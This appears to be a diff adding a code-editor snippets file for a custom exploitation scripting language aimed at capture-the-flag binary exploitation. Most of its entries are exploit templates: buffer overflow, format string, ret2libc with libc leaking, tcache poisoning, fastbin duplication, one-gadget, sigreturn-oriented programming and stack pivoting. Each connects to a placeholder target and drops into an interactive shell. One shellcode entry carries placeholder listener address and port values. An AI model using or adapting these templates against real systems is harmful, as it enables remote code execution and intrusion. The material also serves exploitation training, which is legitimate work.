@@ -1,0 +1,374 @@
+{
+  "Buffer Overflow Exploit": {
+    "prefix": "exploit-bof",
+    "body": [
+      "// Buffer Overflow Exploit",
+      "let offset = ${1:264}",
+      "let payload = cyclic(offset)",
+      "payload = payload + p64(${2:0xdeadbeef})",
+      "",
+      "let conn = connect(\"${3:target.com}\", ${4:1337})",
+      "send(conn, payload)",
+      "interactive(conn)"
+    ],
+    "description": "Basic buffer overflow exploit template"
+  },
+  "ROP Chain": {
+    "prefix": "rop-chain",
+    "body": [
+      "// ROP Chain",
+      "let pop_rdi = ${1:base} + ${2:0x1234}",
+      "let bin_sh = ${1:base} + ${3:0x5678}",
+      "let system = ${1:base} + ${4:0x9abc}",
+      "",
+      "let rop = [",
+      "    pop_rdi,",
+      "    bin_sh,",
+      "    system",
+      "]"
+    ],
+    "description": "ROP chain template"
+  },
+  "Format String Exploit": {
+    "prefix": "exploit-fmt",
+    "body": [
+      "// Format String Exploit",
+      "let target_addr = ${1:0x601020}",
+      "let value = ${2:0xdeadbeef}",
+      "",
+      "let payload = fmtstr_payload(",
+      "    offset: ${3:6},",
+      "    writes: {\"0x601020\": value},",
+      "    arch: \"${4:x64}\"",
+      ")",
+      "",
+      "let conn = connect(\"${5:target.com}\", ${6:1337})",
+      "send(conn, payload)"
+    ],
+    "description": "Format string exploit template"
+  },
+  "Remote Connection": {
+    "prefix": "remote",
+    "body": [
+      "let conn = connect(\"${1:target.com}\", ${2:1337})",
+      "send(conn, ${3:data})",
+      "let response = recv(conn, ${4:1024})",
+      "interactive(conn)"
+    ],
+    "description": "Remote connection template"
+  },
+  "Shellcode Execution": {
+    "prefix": "shellcode",
+    "body": [
+      "let sc = shellcode(",
+      "    arch: \"${1:x64}\",",
+      "    payload: \"${2:execve}\",",
+      "    ${3:lhost: \"10.0.0.1\",}",
+      "    ${4:lport: 4444}",
+      ")",
+      "",
+      "let payload = ${5:padding} + sc",
+      "send(conn, payload)"
+    ],
+    "description": "Shellcode generation template"
+  },
+  "HTTP GET Request": {
+    "prefix": "http-get",
+    "body": [
+      "let response = http_get(\"${1:http://example.com}\")",
+      "let status = response[\"status\"]",
+      "let body = response[\"body\"]",
+      "print(\"Status:\", status)"
+    ],
+    "description": "HTTP GET request"
+  },
+  "Port Scanner": {
+    "prefix": "port-scan",
+    "body": [
+      "let target = \"${1:192.168.1.1}\"",
+      "let ports = [${2:21, 22, 80, 443, 3306, 8080}]",
+      "let open_ports = port_scan(target, ports)",
+      "",
+      "print(\"Open ports on\", target, \":\", open_ports)"
+    ],
+    "description": "Port scanning template"
+  },
+  "Cryptographic Hash": {
+    "prefix": "hash",
+    "body": [
+      "let data = ${1:\"test data\"}",
+      "let hash = ${2|sha256,md5,sha1,sha512|}(data)",
+      "print(\"Hash:\", hex(hash))"
+    ],
+    "description": "Cryptographic hashing"
+  },
+  "Base64 Encoding": {
+    "prefix": "b64encode",
+    "body": [
+      "let data = ${1:\"data to encode\"}",
+      "let encoded = base64_encode(data)",
+      "print(\"Encoded:\", encoded)"
+    ],
+    "description": "Base64 encoding"
+  },
+  "Compression": {
+    "prefix": "compress",
+    "body": [
+      "let data = ${1:\"data to compress\"}",
+      "let compressed = ${2|gzip_compress,zlib_compress|}(data)",
+      "print(\"Compressed size:\", len(compressed))"
+    ],
+    "description": "Data compression"
+  },
+  "Libc Leak and Identify": {
+    "prefix": "libc-leak",
+    "body": [
+      "// Leak libc address and identify version",
+      "let leak = u64(recv(${1:conn}, 8))",
+      "print(\"Leaked address: 0x\" + hex(leak))",
+      "",
+      "let matches = libc_search(\"${2:puts}\", leak)",
+      "if len(matches) > 0 {",
+      "    let libc = matches[0]",
+      "    print(\"Found libc:\", libc.id)",
+      "    ",
+      "    let libc_base = leak - libc.symbols[\"${2:puts}\"]",
+      "    let system = libc_base + libc.symbols[\"system\"]",
+      "    let binsh = libc_base + libc.symbols[\"str_bin_sh\"]",
+      "    ",
+      "    print(\"libc base: 0x\" + hex(libc_base))",
+      "    print(\"system(): 0x\" + hex(system))",
+      "    print(\"/bin/sh: 0x\" + hex(binsh))",
+      "}"
+    ],
+    "description": "Leak libc address and identify version with libc.rip"
+  },
+  "Auto Offset Finding": {
+    "prefix": "auto-offset",
+    "body": [
+      "// Automatically find buffer overflow offset",
+      "let offset = auto_offset(\"${1:./vuln}\")",
+      "print(\"Buffer offset:\", offset)",
+      "",
+      "let payload = \"A\" * offset + p64(${2:0xdeadbeef})",
+      "send(${3:conn}, payload)"
+    ],
+    "description": "Automatically find buffer overflow offset"
+  },
+  "Ret2Libc Full Exploit": {
+    "prefix": "ret2libc",
+    "body": [
+      "// Full ret2libc exploit with leak",
+      "let s = connect(\"${1:target.com}\", ${2:1337})",
+      "let binary = \"${3:./vuln}\"",
+      "",
+      "// Find offset",
+      "let offset = auto_offset(binary)",
+      "print(\"[+] Buffer offset:\", offset)",
+      "",
+      "// Stage 1: Leak libc",
+      "let puts_plt = find_symbol(binary, \"puts\", section: \"plt\")",
+      "let puts_got = find_symbol(binary, \"puts\", section: \"got\")",
+      "let main_addr = find_symbol(binary, \"main\")",
+      "let pop_rdi = rop_find(binary, \"pop rdi; ret\")[0].address",
+      "",
+      "let payload1 = \"A\" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)",
+      "send(s, payload1)",
+      "",
+      "let leak = u64(recv_until(s, \"\\n\")[0..8])",
+      "print(\"[+] Leaked puts: 0x\" + hex(leak))",
+      "",
+      "// Stage 2: Identify libc and exploit",
+      "let matches = libc_search(\"puts\", leak)",
+      "let libc_base = leak - matches[0].symbols[\"puts\"]",
+      "let system = libc_base + matches[0].symbols[\"system\"]",
+      "let binsh = libc_base + matches[0].symbols[\"str_bin_sh\"]",
+      "",
+      "print(\"[+] libc base: 0x\" + hex(libc_base))",
+      "print(\"[+] system: 0x\" + hex(system))",
+      "",
+      "let payload2 = \"A\" * offset + p64(pop_rdi) + p64(binsh) + p64(system)",
+      "send(s, payload2)",
+      "",
+      "print(\"[+] Shell!\")",
+      "interactive(s)"
+    ],
+    "description": "Complete ret2libc exploit with automatic leak and libc identification"
+  },
+  "Flag Search and Submit": {
+    "prefix": "flag-search",
+    "body": [
+      "// Search for flags in output",
+      "let data = recv(${1:conn}, ${2:1024})",
+      "let flags = flag_search(data)",
+      "",
+      "for flag in flags {",
+      "    print(\"[+] Found flag:\", flag)",
+      "    ",
+      "    // Submit to CTF platform",
+      "    flag_submit(",
+      "        \"${3:https://ctf.example.com/api/submit}\",",
+      "        flag",
+      "    )",
+      "}"
+    ],
+    "description": "Search for flags and submit to CTF platform"
+  },
+  "GDB Crash Analysis": {
+    "prefix": "gdb-crash",
+    "body": [
+      "// Analyze crash with GDB",
+      "let info = gdb_run(\"${1:./vuln}\")",
+      "print(\"Signal:\", info.signal)",
+      "print(\"Crash at: 0x\" + hex(info.rip))",
+      "print(\"Registers:\", info.registers)"
+    ],
+    "description": "Run binary under GDB and analyze crash"
+  },
+  "Quick Shell Helper": {
+    "prefix": "quick-shell",
+    "body": [
+      "// Interactive shell helper guide",
+      "quick_shell(\"${1:10.10.14.5}\", ${2:1337})"
+    ],
+    "description": "Display interactive shell helper guide"
+  },
+  "Quick ROP Helper": {
+    "prefix": "quick-rop",
+    "body": [
+      "// Interactive ROP building guide",
+      "quick_rop(\"${1:./vuln}\")"
+    ],
+    "description": "Display interactive ROP chain building guide"
+  },
+  "Quick PWN Helper": {
+    "prefix": "quick-pwn",
+    "body": [
+      "// Complete exploit generation guide",
+      "quick_pwn(\"${1:./vuln}\", \"${2:10.10.14.5}\", ${3:1337})"
+    ],
+    "description": "Display complete exploit generation guide"
+  },
+  "Tcache Poisoning": {
+    "prefix": "tcache-poison",
+    "body": [
+      "// Tcache poisoning exploit",
+      "let s = connect(\"${1:target.com}\", ${2:1337})",
+      "",
+      "// Fill tcache",
+      "for i in range(7) {",
+      "    send(s, \"alloc\\n64\\n\")",
+      "}",
+      "",
+      "// Free chunks",
+      "for i in range(7) {",
+      "    send(s, \"free\\n\" + str(i) + \"\\n\")",
+      "}",
+      "",
+      "// Poison tcache",
+      "send(s, \"edit\\n6\\n\" + p64(${3:target_addr}) + \"\\n\")",
+      "",
+      "// Allocate to target",
+      "send(s, \"alloc\\n64\\n\")",
+      "send(s, \"alloc\\n64\\n\")",
+      "send(s, \"edit\\n8\\n\" + ${4:payload} + \"\\n\")",
+      "",
+      "interactive(s)"
+    ],
+    "description": "Tcache poisoning heap exploit"
+  },
+  "Fastbin Duplication": {
+    "prefix": "fastbin-dup",
+    "body": [
+      "// Fastbin duplication exploit",
+      "let s = connect(\"${1:target.com}\", ${2:1337})",
+      "",
+      "send(s, \"alloc\\n64\\nA\")",
+      "send(s, \"alloc\\n64\\nB\")",
+      "send(s, \"alloc\\n64\\nC\")",
+      "",
+      "send(s, \"free\\n0\")",
+      "send(s, \"free\\n1\")",
+      "send(s, \"free\\n0\")",
+      "",
+      "send(s, \"alloc\\n64\\n\" + p64(${3:target_addr}))",
+      "send(s, \"alloc\\n64\\nX\")",
+      "send(s, \"alloc\\n64\\nY\")",
+      "send(s, \"alloc\\n64\\n\" + ${4:payload})",
+      "",
+      "interactive(s)"
+    ],
+    "description": "Fastbin duplication heap exploit"
+  },
+  "One Gadget Exploit": {
+    "prefix": "one-gadget",
+    "body": [
+      "// One gadget RCE exploit",
+      "let s = connect(\"${1:target.com}\", ${2:1337})",
+      "let binary = \"${3:./vuln}\"",
+      "",
+      "let leak = u64(recv(s, 8))",
+      "let libc_base = leak - ${4:0x809c0}",
+      "",
+      "// one_gadget offset (find with: one_gadget libc.so.6)",
+      "let one_gadget = libc_base + ${5:0x4f3d5}",
+      "",
+      "let offset = auto_offset(binary)",
+      "let payload = cyclic(offset) + p64(one_gadget)",
+      "",
+      "send(s, payload)",
+      "interactive(s)"
+    ],
+    "description": "One gadget RCE exploitation"
+  },
+  "SIGROP Exploit": {
+    "prefix": "sigrop",
+    "body": [
+      "// SIGROP (Sigreturn-Oriented Programming)",
+      "let s = connect(\"${1:target.com}\", ${2:1337})",
+      "let binary = \"${3:./vuln}\"",
+      "",
+      "let syscall_ret = rop_find(binary, \"syscall; ret\")[0].address",
+      "let pop_rax = rop_find(binary, \"pop rax; ret\")[0].address",
+      "",
+      "// Build sigreturn frame",
+      "let frame = sigreturn_frame({",
+      "    \"rax\": 59,  // execve",
+      "    \"rdi\": ${4:binsh_addr},",
+      "    \"rsi\": 0,",
+      "    \"rdx\": 0,",
+      "    \"rip\": syscall_ret",
+      "})",
+      "",
+      "let payload = cyclic(${5:offset}) + p64(pop_rax) + p64(15) + p64(syscall_ret) + frame",
+      "send(s, payload)",
+      "interactive(s)"
+    ],
+    "description": "SIGROP exploitation technique"
+  },
+  "Stack Pivot": {
+    "prefix": "stack-pivot",
+    "body": [
+      "// Stack pivot to BSS/heap",
+      "let s = connect(\"${1:target.com}\", ${2:1337})",
+      "let binary = \"${3:./vuln}\"",
+      "",
+      "let bss_addr = find_section(binary, \".bss\").address + 0x800",
+      "let pop_rsp = rop_find(binary, \"pop rsp; ret\")[0].address",
+      "",
+      "// Build ROP chain in known location",
+      "let rop_chain = [",
+      "    ${4:pop_rdi_addr},",
+      "    ${5:binsh_addr},",
+      "    ${6:system_addr}",
+      "]",
+      "",
+      "send(s, p64(bss_addr) + pack_addresses(rop_chain))",
+      "",
+      "let payload = cyclic(${7:offset}) + p64(pop_rsp) + p64(bss_addr)",
+      "send(s, payload)",
+      "interactive(s)"
+    ],
+    "description": "Stack pivot exploitation technique"
+  }
+}
